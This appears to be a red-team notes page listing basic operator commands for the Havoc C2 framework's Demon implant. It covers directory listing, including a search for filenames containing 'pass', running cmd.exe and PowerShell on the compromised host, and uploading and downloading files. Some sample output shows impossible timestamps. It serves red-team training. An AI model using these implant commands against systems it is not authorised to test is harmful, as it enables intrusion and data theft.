---
author(s):
  - Userware
tags:
  - red-team-infrastructure
  - command-and-control
  - interactive-shell
  - havoc
---
# 02 - Basic Commands

## 2.1 - Navigation

```
Demon » cd <directory_name>

Demon » pwd
[+] Send Task to Agent [12 bytes]
[*] Current directory: C:\Users\aiden
```

## 2.2 - Sleep and Jitter

```
Demon » sleep 10 25
```

## 2.3 - List Contents

```
Demon » dir c:\
[*] [32D45E71] Tasked demon to list directory: c:\
[+] Send Task to Agent [25 bytes]
[*] List Directory: c:\\*

 Size         Type     Last Modified         Name
 ----         ----     -------------------   ----
              dir      01/10/2022 03:21:15   $Recycle.Bin
              dir      24/09/2022 13:21:14   $WinREAgent
              dir      01/10/2022 31:58:16   Config.Msi
              dir      31/08/2022 26:19:14   Documents and Settings
 12.29 kB     file     02/10/2022 55:56:15   DumpStack.log.tmp
 738.20 MB    file     02/10/2022 55:56:15   pagefile.sys
              dir      02/10/2022 38:15:12   PerfLogs
              dir      02/10/2022 29:57:12   Program Files
              dir      02/10/2022 40:57:12   Program Files (x86)
              dir      02/10/2022 36:57:12   ProgramData
              dir      16/09/2022 34:43:22   Recovery
 268.44 MB    file     02/10/2022 55:56:15   swapfile.sys
              dir      02/10/2022 46:56:15   System Volume Information
              dir      26/09/2022 29:53:15   Temp
              dir      02/10/2022 59:13:12   Users
              dir      02/10/2022 58:56:12   Windows
```

TODO: cover each flags on what it does

```
/b -> List only
```

List only the files.

```
Demon » dir [<drive_letter>:]\path\to\directory\ /f
```

List only the directories.

```
Demon » dir [<drive_letter>:]\path\to\directory\ /d
```

Recursive through sub directories

```
Demon » dir [<drive_letter>:]\path\to\directory\ /s
```

Starts a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /starts document
```

Ends a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /ends .txt
```

Contains a specific string in a filename

```
Demon » dir [<drive_letter>:]\path\to\directory\ /contains pass
```

## 2.4 - File Manipulation

Create directory

```
Demon » mkdir C:\path\to\new_directory\
```

Copy file

```
Demon » cp C:\path\to\remote\file.txt C:\path\to\remote\copied_file.txt
```

Move file

```
Demon » mv C:\path\to\remote\file.txt C:\path\to\remote\moved_file.txt
```

Display content's from the file.

```
Demon » cat C:\path\to\remote\file.txt
```

Delete file

```
Demon » remove C:\path\to\remote\file.txt
```

## 2.5 - Execute Shell Commands

### 2.5.1 - Help Menu

```
Demon » help shell

 - Command       :  shell
 - Description   :  executes cmd.exe commands and gets the output
 - Behavior      :  Process Creation
 - Usage         :  shell [commands]
 - Example       :  shell dir c:\windows\system32

Demon » help powershell

 - Command       :  powershell
 - Description   :  executes powershell.exe commands and gets the output
 - Usage         :  powershell [commands]
 - Example       :  powershell dir c:\windows\system32
```

### 2.5.2 - Usage

Execute any `shell` command that the demon implant spawns a child process `cmd.exe`.

```
Demon » shell <command> [arguments]
```

Spawns a child process of `powershell.exe`.

```
Demon » powershell <cmdlet> [arguments]
```

## 2.6 - Upload and Download Files

Download files

```
Demon » download [<drive_letter>:\]path\to\remote\file.txt
```

Upload files

```
Demon » upload /path/to/local/file.txt [<drive_letter>:\]path\to\remote\file.txt
```

## 2.7 - Transfer Files Queue

```
Demon » help transfer

 - Command       :  transfer
 - Description   :  download transfer module
 - Behavior      :  API Only
 - Usage         :  transfer <subcommand>
 - Example       :  transfer list

  Command                        Description      
  ---------                      -------------     
  list                           list current downloads
  stop                           stops a download
  resume                         resumes a download
  remove                         stops and removes a download

Demon » help transfer list

 - Module        :  transfer
 - Sub Command   :  list
 - Description   :  list current downloads
 - Behavior      :  API Only

Demon » help transfer stop

 - Module        :  transfer
 - Sub Command   :  stop
 - Description   :  stops a download
 - Behavior      :  API Only
 - Usage         :  transfer stop <FileID>
 - Example       :  transfer stop ffff

Demon » help transfer resume

 - Module        :  transfer
 - Sub Command   :  resume
 - Description   :  resumes a download
 - Behavior      :  API Only
 - Usage         :  transfer resume <FileID>
 - Example       :  transfer resume ffff

Demon » help transfer remove

 - Module        :  transfer
 - Sub Command   :  remove
 - Description   :  stops and removes a download
 - Behavior      :  API Only
 - Usage         :  transfer remove <FileID>
 - Example       :  transfer remove ffff
```

## 2.8 - Jobs Queue

List job identifiers.

```
Demon » job list
```

Suspend job.

```
Demon » job suspend <job_id>
```

Resume job after suspension.

```
Demon » job resume <job_id>
```

Terminate job.

```
Demon » job kill <job_id>
```

List tasks.

```
Demon » task list
```

Clear all commands in queue to stop the task being executed.

```
Demon » task clear
```

## 2.9 - Terminate Implant

```
Demon » exit
```

---
## References

### Havoc

- [Havoc Framework Documentation](https://havocframework.com/docs/welcome)